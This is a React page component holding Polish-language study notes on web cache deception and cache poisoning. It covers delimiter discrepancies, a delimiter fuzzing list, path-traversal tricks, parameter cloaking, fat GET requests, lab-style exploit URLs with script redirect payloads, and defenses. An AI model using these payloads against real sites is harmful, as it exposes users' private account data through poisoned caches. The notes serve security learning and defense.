import ExampleFrame from '../../exampleFrame/ExampleFrame';
import webCache1 from '../../../assets/web-cache-1.png';


const WebCache = () =>{
    return(
        <section>
            <h1>Web Cache</h1>
            <p>Pamięć podręczna sieci Web to system, który znajduje się między serwerem źródłowym a użytkownikiem. Gdy klient żąda statycznego zasobu, żądanie jest najpierw kierowane do pamięci podręcznej. Jeśli pamięć podręczna nie zawiera kopii zasobu (znane jako brak pamięci podręcznej), żądanie jest przekazywane do serwera źródłowego, który przetwarza żądanie i na nie odpowiada. Odpowiedź jest następnie wysyłana do pamięci podręcznej przed wysłaniem do użytkownika. Pamięć podręczna używa wstępnie skonfigurowanego zestawu reguł, aby określić, czy zapisać odpowiedź.</p>
            <ExampleFrame screen={webCache1}/>
            <p>Skup się na punktach końcowych, które obsługują metody GET, HEAD lub OPTIONS, ponieważ żądania zmieniające stan serwera źródłowego</p>

            <hr />

            <details>
            <summary>Wykrywanie cached responses</summary>
            <div className='waring'>
                <p>Nagłówek <span className='important'>X-Cache</span> zawiera informacje o tym, czy odpowiedź została dostarczona z pamięci podręcznej. Typowe wartości obejmują:
                <br />
                <span className='important'>X-Cache: hit</span> — odpowiedź została dostarczona z pamięci podręcznej.
                <br />
                <span className='important'>X-Cache: miss</span> — pamięć podręczna nie zawierała odpowiedzi na klucz żądania, więc została pobrana z serwera źródłowego
                <br />
                <span className='important'>X-Cache: dynamic</span> — serwer źródłowy dynamicznie wygenerował zawartość. Zazwyczaj oznacza to, że odpowiedź nie nadaje się do buforowania.
                <br />
                <span className='important'>X-Cache: refresh</span> — zawartość buforowana była nieaktualna i wymagała odświeżenia lub ponownej walidacji.
                <br />
                Nagłówek <span className='important'>Cache-Control</span> może zawierać dyrektywę wskazującą buforowanie, np. public z max-age wyższym niż 0. Należy pamiętać, że sugeruje to jedynie, że zasób jest buforowalny. Nie zawsze wskazuje to na buforowanie, ponieważ bufor może czasami zastąpić ten nagłówek.
                <span className='important'>Jeśli zauważysz dużą różnicę w czasie odpowiedzi dla tego samego żądania, może to również oznaczać, że szybsza odpowiedź jest obsługiwana z bufora.</span>
                </p>
            </div>

            </details>

            <hr />

            <details>
            <summary>Rozbierzności</summary>
            <p>Rozbieżności w sposobie, w jaki serwer pamięci podręcznej i serwera źródłowego używają znaków i ciągów znaków jako ograniczników, mogą skutkować lukami w zabezpieczeniach podatności na oszustwa związane z pamięcią podręczną. Rozważmy przykład <span className='important'>/profile;foo.css</span>:</p>
            <div className='waring'>
                <p>Infrastruktura Java Spring używa znaku <span className='important'>;</span> do dodawania parametrów znanych jako zmienne macierzowe. Serwer źródłowy, który używa Java Spring, zinterpretowałby zatem <span className='important'>;</span> jako ogranicznik. Obcina ścieżkę po /profile i zwraca informacje o profilu.</p>
                <p>Większość innych struktur nie używa <span className='important'>;</span> jako ogranicznika. Dlatego pamięć podręczna, która nie używa Java Spring, prawdopodobnie zinterpretuje <span className='important'>;</span> i wszystko po nim jako część ścieżki. Jeśli pamięć podręczna ma regułę przechowywania odpowiedzi na żądania kończące się na <span className='important'>.css</span>, może buforować i udostępniać informacje o profilu tak, jakby był to plik CSS.</p>
                <br />
                <p>Ruby on Rails, który używa <span className='important'>.</span> jako ogranicznika do określenia formatu odpowiedzi</p>
                <p><span className='important'>/profile</span> — to żądanie jest przetwarzane przez domyślny formater HTML, który zwraca informacje o profilu użytkownika.
                    <br />
                    <span className='important'>/profile.css</span> — to żądanie jest rozpoznawane jako rozszerzenie CSS. Nie ma formatera CSS, więc żądanie nie jest akceptowane i zwracany jest błąd.
                    <br />
                    <span className='important'>/profile.ico</span> — to żądanie używa rozszerzenia .ico, które nie jest rozpoznawane przez Ruby on Rails</p>
                <br />
                <p>
                Zakodowane znaki mogą być czasami używane jako ograniczniki. Na przykład rozważmy żądanie <span className='important'>/profile%00foo.js</span>:
                <br />
                    Serwer OpenLiteSpeed ​​używa zakodowanego znaku <span className='important'>null %00</span> jako ogranicznika. Serwer źródłowy, który używa OpenLiteSpeed, zinterpretowałby zatem ścieżkę jako /profile.
                    <span className='important'>Większość innych frameworków odpowiada błędem, jeśli %00 znajduje się w adresie URL</span>. Jednak jeśli pamięć podręczna używa Akamai lub Fastly, zinterpretuje %00 i wszystko po nim jako ścieżkę.
                </p>
            
            </div>

            </details>

            <hr />

            <details>
            <summary>Web cache deception delimiter list</summary>
            <div className='waring'>
                <p>{`!`}</p>
                <p>{`"`}</p>
                <p>{`#`}</p>
                <p>{`$`}</p>
                <p>{`%`}</p>
                <p>{`&`}</p>
                <p>{`'`}</p>
                <p>{`(`}</p>
                <p>{`)`}</p>
                <p>{`*`}</p>
                <p>{`+`}</p>
                <p>{`,`}</p>
                <p>{`-`}</p>
                <p>{`.`}</p>
                <p>{`/`}</p>
                <p>{`:`}</p>
                <p>{`;`}</p>
                <p>{`<`}</p>
                <p>{`=`}</p>
                <p>{`>`}</p>
                <p>{`?`}</p>
                <p>{`@`}</p>
                <p>{`[`}</p>
                <p>\</p>
                <p>{`]`}</p>
                <p>{`^`}</p>
                <p>{`_`}</p>
                <p>`</p>
                <p>{`{`}</p>
                <p>{`|`}</p>
                <p>{`}`}</p>
                <p>{`~`}</p>
                <p>{`%21`}</p>
                <p>{`%22`}</p>
                <p>{`%23`}</p>
                <p>{`%24`}</p>
                <p>{`%25`}</p>
                <p>{`%26`}</p>
                <p>{`%27`}</p>
                <p>{`%28`}</p>
                <p>{`%29`}</p>
                <p>{`%2A`}</p>
                <p>{`%2B`}</p>
                <p>{`%2C`}</p>
                <p>{`%2D`}</p>
                <p>{`%2E`}</p>
                <p>{`%2F`}</p>
                <p>{`%3A`}</p>
                <p>{`%3B`}</p>
                <p>{`%3C`}</p>
                <p>{`%3D`}</p>
                <p>{`%3E`}</p>
                <p>{`%3F`}</p>
                <p>{`%40`}</p>
                <p>{`%5B`}</p>
                <p>{`%5C`}</p>
                <p>{`%5D`}</p>
                <p>{`%5E`}</p>
                <p>{`%5F`}</p>
                <p>{`%60`}</p>
                <p>{`%7B`}</p>
                <p>{`%7C`}</p>
                <p>{`%7D`}</p>
                <p>{`%7E`}</p>
                <p>{`%00`}</p>
                <p>{`%0A`}</p>
                <p>{`%09`}</p>
            </div>
            </details>

            <hr />

            <details>
            <summary>Exploiting static directory</summary>
            <div className='waring'>
                <p>/static</p>
                <p>/assets</p>
                <p>/scripts</p>
                <p>/images</p>
                <br />
                <p>Przykłady</p>
                <p><span className='important'>/static/..%2fprofile</span></p>
                <p><span className='important'>/aaa/..%2fassets/js/stockCheck.js</span></p>
                <p><span className='important'>/assets/..%2fjs/stockCheck.js</span></p>
            </div>
            </details>

            <hr />

            <details>
            <summary>Maskowanie parametrów pamięci podręcznej</summary>
                <p>Rozważ następującą prośbę:</p>
                <p>GET /?keyed_param=abc&excluded_param=123<span className='important'>;keyed_param=bad-stuff-here</span></p>
                <p>Jak sugerują nazwy, <span className='important'>keyed_param</span> jest zawarty w kluczu pamięci podręcznej, ale disabled_param nie. <span className='important'>Wiele pamięci podręcznych zinterpretuje to tylko jako dwa parametry, ograniczone znakiem ampersand:</span></p>
                <div className='waring'>
                    <p>1. keyed_param=abc</p>
                    <p>2. excluded_param=123;keyed_param=bad-stuff-here</p>
                </div>
                <p>Gdy algorytm parsowania usunie <span className='important'>exclude_param</span>, klucz pamięci podręcznej będzie zawierał tylko <span className='important'>keyed_param=abc</span>. Jednak w zapleczu <span className='important'><u>Ruby on Rails</u> widzi średnik i dzieli ciąg zapytania na trzy oddzielne parametry:</span></p>
                <div className='waring'>
                    <p>1. keyed_param=abc</p>
                    <p>2. excluded_param=123</p>
                    <p>3. keyed_param=bad-stuff-here</p>
                </div>
            </details>


            <hr />

            <details>
            <summary>Wykorzystywanie wsparcia Fat GET</summary>
                <p>W wybranych przypadkach metoda HTTP może nie być kluczowana. Może to umożliwić zatrucie pamięci podręcznej żądaniem POST zawierającym złośliwy ładunek w treści. <span className='important'>Twój ładunek będzie wtedy nawet obsługiwany w odpowiedzi na żądania GET użytkowników</span>. Chociaż ten scenariusz jest dość rzadki, czasami możesz osiągnąć podobny efekt, <span className='important'>po prostu dodając ciało do żądania GET, aby utworzyć „grube” żądanie GET</span>:</p>
                <div className='waring'>
                    <p>GET /?param=innocent HTTP/1.1</p>
                    <p>...</p>
                    <p>param=bad-stuff-here</p>
                </div>
                <div className='waring'>
                    <p>GET /?param=innocent HTTP/1.1</p>
                    <p><span className='important'>X-HTTP-Method-Override: POST</span></p>
                    <p>...</p>
                    <p>param=bad-stuff-here</p>
                </div>
            </details>

            <hr />

            <details>
            <summary>Wykrywanie ciągu zapytania bez klucza</summary>
            <p>Na przykład następujące wpisy mogą być buforowane osobno, ale traktowane jako równoważne z GET / w zapleczu</p>
            <p>Apache: GET <span className='important'>//</span></p>
            <p>Nginx: GET <span className='important'>/%2F</span></p>
            <p>PHP: GET <span className='important'>/index.php/xyz</span></p>
            <p>.NET: GET <span className='important'>{`/(A(xyz)/`}</span></p>
            </details>

            <hr />

            <details>
            <summary>Przykłady</summary>
            <div className='waring'>
                <p>https://YOUR-LAB-ID.web-security-academy.net/my-account/<span className='important'>;wcd</span>.js</p>
                <p>{`<script>document.location="https://YOUR-LAB-ID.web-security-academy.net/my-account/wcd.js"</script>`}</p>
                <br />
                <br />
                <p>https://YOUR-LAB-ID.web-security-academy.net/my-account/<span className='important'>;wcd</span>.js</p>
                <p>{`<script>document.location="https://YOUR-LAB-ID.web-security-academy.net/my-account;wcd.js"</script>`}</p>
                <br />
                <br />
                <p>https://YOUR-LAB-ID.web-security-academy.net/resources/<span className='important'>..%2fmy-account?wcd</span></p>
                <p>{`<script>document.location="https://YOUR-LAB-ID.web-security-academy.net/resources/..%2fmy-account?wcd"</script>`}</p>
                <br />
                <br />
                <p>https://YOUR-LAB-ID.web-security-academy.net/my-account<span className='important'>?%2f%2e%2e%2fresources</span></p>
                <p>{`<script>document.location="https://YOUR-LAB-ID.web-security-academy.net/my-account%23%2f%2e%2e%2fresources?wcd"</script>`}</p>
            </div>

            </details>

            <hr />

            <details>
            <summary class="defense">Zapobieganie</summary>
                <p>Możesz podjąć szereg kroków, aby zapobiec lukom w zabezpieczeniach związanym z oszustwami pamięci podręcznej:</p>
                <ul class="defense">
                    <li>Zawsze używaj nagłówków Cache-Control do oznaczania zasobów dynamicznych, ustawianych za pomocą dyrektyw no-store i private.</li>
                    <li>Skonfiguruj ustawienia CDN tak, aby reguły buforowania nie nadpisywały nagłówka Cache-Control.</li>
                    <li>Aktywuj wszelkie zabezpieczenia, jakie ma Twoja sieć CDN przed atakami typu web cache deception. Wiele sieci CDN umożliwia ustawienie reguły pamięci podręcznej, która weryfikuje, czy typ zawartości odpowiedzi pasuje do rozszerzenia pliku URL żądania. Na przykład Cache Deception Armor firmy Cloudflare.</li>
                    <li>Sprawdź, czy nie występują żadne rozbieżności pomiędzy sposobem, w jaki serwer źródłowy i serwer pamięci podręcznej interpretują ścieżki URL.</li>
                </ul>

            </details>
        </section>
    )
}

export default WebCache;